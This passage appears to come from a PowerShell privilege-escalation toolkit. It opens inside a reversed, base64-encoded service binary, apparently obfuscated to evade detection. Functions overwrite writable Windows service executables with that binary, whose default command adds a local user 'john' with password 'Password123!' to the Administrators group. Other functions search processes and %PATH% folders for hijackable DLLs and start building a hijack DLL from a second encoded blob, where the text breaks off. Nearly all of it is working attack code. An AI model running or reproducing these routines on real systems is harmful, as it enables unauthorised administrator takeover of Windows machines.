ACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIAACAgAAIA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"


        $klassx32 = ([regex]::Matches($Bx64Binary,'.','RightToLeft') | ForEach {$_.value}) -join ''
        $B64Binary = $klassx32
        [Byte[]] $Binary = [Byte[]][Convert]::FromBase64String($B64Binary)

        if ($PSBoundParameters['Command']) {
            $ServiceCommand = $Command
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $UserNameToAdd = $Credential.UserName
                $PasswordToAdd = $Credential.GetNetworkCredential().Password
            }
            else {
                $UserNameToAdd = $UserName
                $PasswordToAdd = $Password
            }

            if ($UserNameToAdd.Contains('\')) {
                # only adding a domain user to the local group, no user creation
                $ServiceCommand = "net localgroup $LocalGroup $UserNameToAdd /add"
            }
            else {
                # create a local user and add it to the local specified group
                $ServiceCommand = "net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
            }
        }
    }

    PROCESS {

        $TargetService = Get-Service -Name $Name

        # get the unicode byte conversions of all arguments
        $Enc = [System.Text.Encoding]::Unicode
        $ServiceNameBytes = $Enc.GetBytes($TargetService.Name)
        $CommandBytes = $Enc.GetBytes($ServiceCommand)

        # patch all values in to their appropriate locations
        for ($i=0; $i -lt ($ServiceNameBytes.Length); $i++) {
            # service name offset = 2458
            $Binary[$i+2458] = $ServiceNameBytes[$i]
        }
        for ($i=0; $i -lt ($CommandBytes.Length); $i++) {
            # cmd offset = 2535
            $Binary[$i+2535] = $CommandBytes[$i]
        }

        Set-Content -Value $Binary -Encoding Byte -Path $Path -Force -ErrorAction Stop

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceName' $TargetService.Name
        $Out | Add-Member Noteproperty 'Path' $Path
        $Out | Add-Member Noteproperty 'Command' $ServiceCommand
        $Out.PSObject.TypeNames.Insert(0, 'PowerOp.ServiceBinary')
        $Out
    }
}


function Install-ServiceBinary {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerOp.ServiceBinary.Installed')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String]
        $UserName = 'john',

        [String]
        $Password = 'Password123!',

        [String]
        $LocalGroup = 'Administrators',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [String]
        [ValidateNotNullOrEmpty()]
        $Command
    )

    BEGIN {
        if ($PSBoundParameters['Command']) {
            $ServiceCommand = $Command
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $UserNameToAdd = $Credential.UserName
                $PasswordToAdd = $Credential.GetNetworkCredential().Password
            }
            else {
                $UserNameToAdd = $UserName
                $PasswordToAdd = $Password
            }

            if ($UserNameToAdd.Contains('\')) {
                # only adding a domain user to the local group, no user creation
                $ServiceCommand = "net localgroup $LocalGroup $UserNameToAdd /add"
            }
            else {
                # create a local user and add it to the local specified group
                $ServiceCommand = "net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
            }
        }
    }

    PROCESS {
        $TargetService = Get-Service -Name $Name -ErrorAction Stop
        $ServiceDetails = $TargetService | Get-ServiceDetail
        $ModifiableFiles = $ServiceDetails.PathName | Get-ModifiablePath -Literal

        if (-not $ModifiableFiles) {
            throw "Service binary '$($ServiceDetails.PathName)' for service $($ServiceDetails.Name) not modifiable by the current user."
        }

        $ServicePath = $ModifiableFiles | Select-Object -First 1 | Select-Object -ExpandProperty ModifiablePath
        $BackupPath = "$($ServicePath).bak"

        Write-Verbose "Backing up '$ServicePath' to '$BackupPath'"

        try {
            Copy-Item -Path $ServicePath -Destination $BackupPath -Force
        }
        catch {
            Write-Warning "Error backing up '$ServicePath' : $_"
        }

        $Result = Write-ServiceBinary -Name $ServiceDetails.Name -Command $ServiceCommand -Path $ServicePath
        $Result | Add-Member Noteproperty 'BackupPath' $BackupPath
        $Result.PSObject.TypeNames.Insert(0, 'PowerOp.ServiceBinary.Installed')
        $Result
    }
}


function Restore-ServiceBinary {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerOp.ServiceBinary.Restored')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Position = 1)]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $BackupPath
    )

    PROCESS {
        $TargetService = Get-Service -Name $Name -ErrorAction Stop
        $ServiceDetails = $TargetService | Get-ServiceDetail
        $ModifiableFiles = $ServiceDetails.PathName | Get-ModifiablePath -Literal

        if (-not $ModifiableFiles) {
            throw "Service binary '$($ServiceDetails.PathName)' for service $($ServiceDetails.Name) not modifiable by the current user."
        }

        $ServicePath = $ModifiableFiles | Select-Object -First 1 | Select-Object -ExpandProperty ModifiablePath
        $BackupPath = "$($ServicePath).bak"

        Copy-Item -Path $BackupPath -Destination $ServicePath -Force
        Remove-Item -Path $BackupPath -Force

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceName' $ServiceDetails.Name
        $Out | Add-Member Noteproperty 'ServicePath' $ServicePath
        $Out | Add-Member Noteproperty 'BackupPath' $BackupPath
        $Out.PSObject.TypeNames.Insert(0, 'PowerOp.ServiceBinary.Restored')
        $Out
    }
}


########################################################
#
# DLL Hijacking
#
########################################################

function Find-ProcessDLLHijack {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerOp.HijackableDLL.Process')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ProcessName')]
        [String[]]
        $Name = $(Get-Process | Select-Object -Expand Name),

        [Switch]
        $ExcludeWindows,

        [Switch]
        $ExcludeProgramFiles,

        [Switch]
        $ExcludeOwned
    )

    BEGIN {
        # the known DLL cache to exclude from our findings
        #   http://blogs.msdn.com/b/larryosterman/archive/2004/07/19/187752.aspx
        $Keys = (Get-Item "HKLM:\System\CurrentControlSet\Control\Session Manager\KnownDLLs")
        $KnownDLLs = $(ForEach ($KeyName in $Keys.GetValueNames()) { $Keys.GetValue($KeyName).tolower() }) | Where-Object { $_.EndsWith(".dll") }
        $KnownDLLPaths = $(ForEach ($name in $Keys.GetValueNames()) { $Keys.GetValue($name).tolower() }) | Where-Object { -not $_.EndsWith(".dll") }
        $KnownDLLs += ForEach ($path in $KnownDLLPaths) { ls -force $path\*.dll | Select-Object -ExpandProperty Name | ForEach-Object { $_.tolower() }}
        $CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

        # get the owners for all processes
        $Owners = @{}
        Get-WmiObject -Class win32_process | Where-Object {$_} | ForEach-Object { $Owners[$_.handle] = $_.getowner().user }
    }

    PROCESS {

        ForEach ($ProcessName in $Name) {

            $TargetProcess = Get-Process -Name $ProcessName

            if ($TargetProcess -and $TargetProcess.Path -and ($TargetProcess.Path -ne '') -and ($Null -ne $TargetProcess.Path)) {

                try {
                    $BasePath = $TargetProcess.Path | Split-Path -Parent
                    $LoadedModules = $TargetProcess.Modules
                    $ProcessOwner = $Owners[$TargetProcess.Id.ToString()]

                    ForEach ($Module in $LoadedModules){

                        $ModulePath = "$BasePath\$($Module.ModuleName)"

                        # if the module path doesn't exist in the process base path folder
                        if ((-not $ModulePath.Contains('C:\Windows\System32')) -and (-not (Test-Path -Path $ModulePath)) -and ($KnownDLLs -NotContains $Module.ModuleName)) {

                            $Exclude = $False

                            if ($PSBoundParameters['ExcludeWindows'] -and $ModulePath.Contains('C:\Windows')) {
                                $Exclude = $True
                            }

                            if ($PSBoundParameters['ExcludeProgramFiles'] -and $ModulePath.Contains('C:\Program Files')) {
                                $Exclude = $True
                            }

                            if ($PSBoundParameters['ExcludeOwned'] -and $CurrentUser.Contains($ProcessOwner)) {
                                $Exclude = $True
                            }

                            # output the process name and hijackable path if exclusion wasn't marked
                            if (-not $Exclude){
                                $Out = New-Object PSObject
                                $Out | Add-Member Noteproperty 'ProcessName' $TargetProcess.ProcessName
                                $Out | Add-Member Noteproperty 'ProcessPath' $TargetProcess.Path
                                $Out | Add-Member Noteproperty 'ProcessOwner' $ProcessOwner
                                $Out | Add-Member Noteproperty 'ProcessHijackableDLL' $ModulePath
                                $Out.PSObject.TypeNames.Insert(0, 'PowerOp.HijackableDLL.Process')
                                $Out
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "Error: $_"
                }
            }
        }
    }
}


function Find-PathDLLHijack {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerOp.HijackableDLL.Path')]
    [CmdletBinding()]
    Param()

    # use -Literal so the spaces in %PATH% folders are not tokenized
    Get-Item Env:Path | Select-Object -ExpandProperty Value | ForEach-Object { $_.split(';') } | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
        $TargetPath = $_
        $ModifidablePaths = $TargetPath | Get-ModifiablePath -Literal | Where-Object {$_ -and ($Null -ne $_) -and ($Null -ne $_.ModifiablePath) -and ($_.ModifiablePath.Trim() -ne '')}
        ForEach ($ModifidablePath in $ModifidablePaths) {
            if ($Null -ne $ModifidablePath.ModifiablePath) {
                $ModifidablePath | Add-Member Noteproperty '%PATH%' $_
                $ModifidablePath | Add-Member Aliasproperty Name '%PATH%'
                $ModifidablePath.PSObject.TypeNames.Insert(0, 'PowerOp.HijackableDLL.Path')
                $ModifidablePath
            }
        }
    }
}


function Write-HijackDll {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerOp.HijackableDLL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $DllPath,

        [String]
        [ValidateSet('x86', 'x64')]
        $Architecture,

        [String]
        [ValidateNotNullOrEmpty()]
        $BatPath,

        [String]
        $UserName = 'john',

        [String]
        $Password = 'Password123!',

        [String]
        $LocalGroup = 'Administrators',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [String]
        [ValidateNotNullOrEmpty()]
        $Command
    )

    function local:Invoke-PatchDll {


        [OutputType('System.Byte[]')]
        [CmdletBinding()]
        Param(
            [Parameter(Mandatory = $True)]
            [Byte[]]
            $DllBytes,

            [Parameter(Mandatory = $True)]
            [String]
            $SearchString,

            [Parameter(Mandatory = $True)]
            [String]
            $ReplaceString
        )

        $ReplaceStringBytes = ([System.Text.Encoding]::UTF8).GetBytes($ReplaceString)

        $Index = 0
        $S = [System.Text.Encoding]::ASCII.GetString($DllBytes)
        $Index = $S.IndexOf($SearchString)

        if ($Index -eq 0) {
            throw("Could not find string $SearchString !")
        }

        for ($i=0; $i -lt $ReplaceStringBytes.Length; $i++) {
            $DllBytes[$Index+$i]=$ReplaceStringBytes[$i]
        }

        return $DllBytes
    }

    if ($PSBoundParameters['Command']) {
        $BatCommand = $Command
    }
    else {
        if ($PSBoundParameters['Credential']) {
            $UserNameToAdd = $Credential.UserName
            $PasswordToAdd = $Credential.GetNetworkCredential().Password
        }
        else {
            $UserNameToAdd = $UserName
            $PasswordToAdd = $Password
        }

        if ($UserNameToAdd.Contains('\')) {
            # only adding a domain user to the local group, no user creation
            $BatCommand = "net localgroup $LocalGroup $UserNameToAdd /add"
        }
        else {
            # create a local user and add it to the local specified group
            $BatCommand = "net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
        }
    }

    $ztring32 = "==AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA